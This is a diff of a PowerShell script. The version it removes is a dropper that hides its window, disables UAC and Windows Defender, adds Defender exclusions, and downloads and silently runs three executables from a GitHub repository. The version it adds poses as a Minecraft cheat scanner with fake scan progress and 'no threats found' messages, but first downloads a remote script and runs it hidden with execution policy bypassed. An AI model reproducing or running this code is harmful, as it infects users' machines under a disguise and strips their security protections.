@@ -1,68 +1,120 @@
-$code = @'
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("User32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
-'@
-$null = Start-Job -ScriptBlock ([scriptblock]::Create($code))
-$Host.UI.RawUI.WindowTitle = "System Update"
-function Download-File {
-    param($url, $path)
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        $wc.DownloadFile($url, $path)
-        return $true
-    } catch {
-        return $false
-    }
-}
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
+$Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"
+$url = "https://github.com/sys1e/cmd/raw/refs/heads/main/123.ps1"
+$path = "$env:TEMP\123.ps1"
 try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue
-    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
-    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
-} catch { }
-$urls = @(
-    "https://github.com/sys1e/catl/raw/refs/heads/main/Client.exe",
-    "https://github.com/sys1e/catl/raw/refs/heads/main/powershell.exe",
-    "https://github.com/sys1e/catl/raw/refs/heads/main/svchost1.exe"
-)
-$downloaded = @()
-foreach ($url in $urls) {
-    $fileName = $url.Split("/")[-1]
-    $path = "$env:TEMP\$fileName"
-    
-    # Скачиваем
-    $success = Download-File -url $url -path $path
-    
-    if ($success -and (Test-Path $path) -and ((Get-Item $path).Length -gt 0)) {
-        $downloaded += $path
-        # Добавляем в исключения Defender
-        try { Add-MpPreference -ExclusionPath $path -Force -ErrorAction SilentlyContinue } catch { }
+    Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
+    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
+} catch {}
+Clear-Host
+function Show-KRAKEH-Header {
+    $headerArt = @"
+NO!                          MNO!
+     MNO!!         [NBK]          MNNOO!
+   MMNO!                           MNNOO!!
+ MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!!
+ !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO!
+       ! MMMMMMMMMMMMMPPPPOOOOIII! !
+        MMMMMMMMMMMMPPPPPOOOOOOII!!
+        MMMMMOOOOOOPPPPPPPPOOOOMII!
+        MMMMM..    OPPMMP    .,OMI!
+        MMMM::   o.,OPMP,.o   ::I!!
+          NNM:::.,,OOPM!P,.::::!!
+         MMNNNNNOOOOPMO!!IIPPO!!O!
+         MMMMMNNNNOO:!!:!!IPPPPOO!
+          MMMMMNNOOMMNNIIIPPPOO!!
+             MMMONNMMNNNIIIOO!
+           MN MOMMMNNNIIIIIO! OO
+          MNO! IiiiiiiiiiiiI OOOO
+     NNN.MNO!   O!!!!!!!!!O   OONO NO!
+    MNNNNNO!    OOOOOOOOOOO    MMNNON!
+      MNNNNO!    PPPPPPPPP    MMNON!
+         OO!                   ON!
+"@ -split "`n"
+    foreach ($line in $headerArt) {
+        Write-Host $line -ForegroundColor Red
     }
+    Write-Host "==================================================" -ForegroundColor Magenta
+    Write-Host "       Fix CONSOLE v2.0 - RELEASE EDITION       " -ForegroundColor Yellow
+    Write-Host "==================================================" -ForegroundColor Magenta
+    Write-Host ""
 }
-foreach ($file in $downloaded) {
-    try {
-        Start-Process -FilePath $file -WindowStyle Hidden -ErrorAction SilentlyContinue
-    } catch { }
-}
-Start-Sleep -Seconds 2
-try {
-    $null = Start-Job -ScriptBlock {
-        Start-Sleep -Seconds 1
-        Get-Process -Name "powershell" -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() }
-        exit
+function Show-ProgressBar {
+    param($Text, $DurationMs = 2800)
+    Write-Host "   $Text" -ForegroundColor Cyan
+    for ($i = 0; $i -le 100; $i += 5) {
+        $filled = [math]::Floor(50 * $i / 100)
+        $bar = "[" + ("▓" * $filled) + ("░" * (50 - $filled)) + "] $i%"
+        Write-Host -NoNewline "`r$bar" -ForegroundColor White
+        Start-Sleep -Milliseconds ($DurationMs / 20)
     }
-} catch { }
-Exit
+    Write-Host ""
+}
+do {
+    Clear-Host
+    Show-KRAKEH-Header
+    Write-Host "   [1] MINECRAFT Fix SCAN" -ForegroundColor Green
+    Write-Host "   [2] BETA Fix SCAN" -ForegroundColor Yellow
+    Write-Host "   [3] FULL Fix CHECK" -ForegroundColor Cyan
+    Write-Host "   [4] EXIT" -ForegroundColor DarkRed
+    Write-Host ""
+    Write-Host "==================================================" -ForegroundColor DarkGray
+    $choice = Read-Host "   SELECT OPTION"
+    switch ($choice) {
+        "1" {
+            Clear-Host
+            Show-KRAKEH-Header
+            Write-Host "`n   [MINECRAFT SCAN INITIATED]" -ForegroundColor Green
+            Show-ProgressBar -Text "Checking game folder"
+            Show-ProgressBar -Text "Analyzing injected modules"
+            Show-ProgressBar -Text "Verifying signatures"
+            Write-Host "`n   [KRA]: SCAN COMPLETE - NO THREATS FOUND" -ForegroundColor Green
+            Write-Host "   Press any key to continue..." -ForegroundColor Gray
+            [Console]::ReadKey($true) | Out-Null
+        }
+        "2" {
+            Clear-Host
+            Show-KRAKEH-Header
+            Write-Host "`n   [Fix SCAN INITIATED]" -ForegroundColor Yellow
+            Show-ProgressBar -Text "Initializing deep scan"
+            Show-ProgressBar -Text "Analyzing heuristics"
+            Show-ProgressBar -Text "Verifying bypass patterns"
+            Write-Host "`n   [KRA]: BETA SCAN COMPLETE - SYSTEM CLEAN" -ForegroundColor Yellow
+            [Console]::ReadKey($true) | Out-Null
+        }
+        "3" {
+            Clear-Host
+            Show-KRAKEH-Header
+            Write-Host "`n   [FULL Fix CHECKER INITIATED]" -ForegroundColor Cyan
+            Show-ProgressBar -Text "Scanning .minecraft folder"
+            Show-ProgressBar -Text "Checking cache and assets"
+            Show-ProgressBar -Text "Verifying mod configurations"
+            Show-ProgressBar -Text "Finalizing report"
+            Write-Host "`n   [KRA]: FULL CHECK COMPLETE - ALL FILES VERIFIED" -ForegroundColor Cyan
+            [Console]::ReadKey($true) | Out-Null
+        }
+        "4" {
+            Write-Host "`n   [KRA]: EXITING SHELLBAG CONSOLE..." -ForegroundColor DarkRed
+            break
+        }
+        default {
+            Write-Host "`n   [KRA]: INVALID OPTION - PLEASE SELECT 1-4" -ForegroundColor Red
+            Start-Sleep -Seconds 1
+        }
+    }
+} while ($choice -ne "4")
+Clear-Host
+Show-KRAKEH-Header
+Write-Host ""
+Write-Host "   читы не " -NoNewline -ForegroundColor Red
+Write-Host "найдены " -NoNewline -ForegroundColor Yellow
+Write-Host "просмотр " -NoNewline -ForegroundColor Green
+Write-Host "закончен " -NoNewline -ForegroundColor Blue
+Write-Host "спасибо " -NoNewline -ForegroundColor Cyan
+Write-Host "что " -NoNewline -ForegroundColor Magenta
+Write-Host "вы " -NoNewline -ForegroundColor White
+Write-Host "с " -NoNewline -ForegroundColor DarkYellow
+Write-Host "нами" -ForegroundColor Red
+Write-Host " <3" -ForegroundColor Magenta
+Start-Sleep -Seconds 1
+Start-Process "cmd.exe" -ArgumentList "/c curl parrot.live && pause" -WindowStyle Hidden
+Write-Host "`n   WELCOME TO CLAH FLUX" -ForegroundColor DarkGreen
